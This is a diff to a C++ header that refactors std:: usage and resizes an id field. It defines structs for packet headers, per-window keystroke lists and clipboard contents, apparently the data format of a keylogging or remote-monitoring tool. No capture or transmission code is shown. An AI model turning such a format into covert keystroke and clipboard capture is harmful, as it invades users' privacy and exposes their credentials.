@@ -8,7 +8,9 @@
 
 namespace LRCData
 {
-	typedef std::vector<uint8_t> ByteVector;
+	using namespace std;
+
+	typedef vector<uint8_t> ByteVector;
 
 	enum Type
 	{
@@ -21,7 +23,7 @@ namespace LRCData
 	{
 		uint16_t signature;
 		uint8_t version;
-		char id[65];
+		uint8_t id[64];
 		uint8_t type;
 		uint32_t length;
 	};
@@ -36,20 +38,20 @@ namespace LRCData
 	struct WNDInfo
 	{
 		uint32_t time;
-		std::wstring process;
-		std::wstring title;
+		wstring process;
+		wstring title;
 	};
 
 	struct Keyboard
 	{
 		WNDInfo wndInfo;
-		std::list<VKInfo> keys;
+		list<VKInfo> keys;
 	};
 
 	struct Clipboard
 	{
 		WNDInfo wndInfo;
-		std::wstring data;
+		wstring data;
 	};
 }
 
